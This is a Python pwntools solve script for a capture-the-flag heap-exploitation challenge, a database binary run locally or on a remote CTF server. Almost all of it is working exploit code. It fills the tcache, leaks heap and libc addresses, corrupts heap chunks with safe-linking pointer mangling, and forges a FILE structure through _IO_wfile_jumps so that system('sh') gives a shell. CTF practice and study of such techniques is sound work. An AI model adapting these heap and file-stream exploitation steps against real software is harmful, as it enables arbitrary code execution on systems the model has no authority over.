#!/usr/bin/env python3
from pwn import *

# =========================================================
#                          SETUP
# =========================================================
exe = './db'
elf = context.binary = ELF(exe, checksec=True)
libc = './libc.so.6'
libc = ELF(libc, checksec=False)
context.log_level = 'debug'
context.terminal = ["tmux", "splitw", "-h", "-p", "65"]
host, port = 'einstein-bd91179989a5c1ab.deploy.phreaks.fr', 443

pid = None

def gdbscript():
    global pid
    gdbscript = f'''
    init-pwndbg
    set sysroot /proc/{pid}/root
    c
    '''.format(**locals())
    return gdbscript

def initialize(argv=[]):
    global pid
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript())
    elif args.REMOTE:
        context.log_level = 'info'
        return remote(host, port, ssl=True)
    elif args.DOCKER:
        p = remote("localhost", 1337)
        time.sleep(1)
        pid = process(["pgrep", "-fx", "/app/db"]).recvall().strip().decode()
        attach(int(pid), gdbscript=gdbscript(), sysroot=f"/proc/{pid}/root", exe=elf.path)
        return p
    else:
        return process([exe] + argv)


# =========================================================
#                         EXPLOITS
# =========================================================
def onegadget():
    try:
        result = process(["one_gadget", "-r", "-l", "30", "libc.so.6"])
        output = result.recvline().decode().strip().split(" ")
        result.close()
        one_gadget = [int(addr) for addr in output]
        return one_gadget
    except Exception as e:
        print(f"Error running one_gadget: {e}")
        return []

def demangle(val):
    mask = 0xfff << 52
    while mask:
        v = val & mask
        val ^= (v >> 12)
        mask >>= 12
    return val

def mangle(heap_addr, val):
    return (heap_addr >> 12) ^ val

def fsrop(fp=libc.sym._IO_2_1_stdout_, offset=0):
    global heap
    fs = FileStructure()   
    fs.flags = b"  sh;".ljust(0x8,b"\x00")   
    fs._IO_read_end = fp 
    fs._lock = fp+0x100 
    fs._wide_data = fp - 0x10
    fs.unknown2 = p64(0)*3 + p64(1) + p64(libc.sym.system) + p64(fp + 0x60)
    fs.vtable = libc.sym._IO_wfile_jumps + offset   
    return bytes(fs)

def create_table(table_idx): #Malloc 0x31 and 0x421
    io.sendlineafter(">>> ", b"1")
    io.sendlineafter("Index: ", str(table_idx).encode())

def free_table(table_idx): #Free 0x31 and 0x421
    io.sendlineafter(">>> ", b"2")
    io.sendlineafter("Table Page Index: ", str(table_idx).encode())

def insert_record(table_idx, size, data=b""): #Malloc and Free 0x21 and size
    io.sendlineafter(">>> ", b"3")
    io.sendlineafter("Index: ", str(table_idx).encode())
    io.sendlineafter("Varchar Length: ", str(size).encode())
    if size:
       io.sendlineafter("Varchar: ", data)

def view_record(table_idx, idx): #Free 0x21 Once
    io.sendlineafter(">>> ", b"4")
    io.sendlineafter("Index: ", str(table_idx).encode())
    io.sendlineafter("Slot ID: ", str(idx).encode())

def edit_record(table_idx, idx, size, data=b""): #Malloc size
    io.sendlineafter(">>> ", b"5")
    io.sendlineafter("Index: ", str(table_idx).encode())
    io.sendlineafter("Slot ID: ", str(idx).encode())
    io.sendlineafter("Varchar Length: ", str(size).encode())
    if size:
       io.sendlineafter("Varchar: ", data)


def exploit():
    global io, heap
    # Author solve script https://rosayxy.github.io/tpctf-author-writeup-ezdb/
    io = initialize()
    with log.progress("Preparing for filling tcache"), context.silent:
        for i in range(7):
            create_table(i)
        create_table(7)
        create_table(8)
        for i in range(203):
            insert_record(0, 1)
        insert_record(0, 6, b"\x02"*6)
    with log.progress("Filling tcache & Leak libc"), context.silent:
        for i in range(8):
            free_table(8-i)
        view_record(0, 203)
        io.recvuntil(b"Varchar: ")
        io.recvline()
        leak = io.recvuntil(b"------- Table Page Operations -------")
    for i in range(35):
        log.info("%#d: %#x", i+1, u64(leak[i*8:(i+1)*8]))
    heap = (u64(leak[27*8:(27+1)*8]) >> 4) - 0x12000
    libc_leak = u64(leak[33*8:(33+1)*8]) >> 16
    libc.address = libc_leak - (libc.sym["main_arena"] + 96)
    log.info("Heap: %#x", heap)
    log.info("Libc leak: %#x", libc_leak)
    log.info("Libc base: %#x", libc.address)
    with log.progress("Cleaning bins"), context.silent:
        for i in range(8):
            create_table(i+1)
    fake_fp = heap + 0x12a68
    with log.progress("Using stderr + 0x68 get shell"), context.silent:
        insert_record(1, 0xf8, fsrop(fake_fp))
        target = libc.sym["_IO_2_1_stderr_"] + 0x68
        edit_record(0, 203, 0x148, b"\x02"*6+ b"\x00"*3 + p64(0)*26 + p64(0x31) + p64(heap+ 0x12320)*2 + p64(target+0x8) + p64(heap+ 0x12320))
        insert_record(8, 0x8, p64(fake_fp))
        io.recvuntil(">>> ")
        io.sendline("6")
    io.interactive()

if __name__ == '__main__':
    exploit()
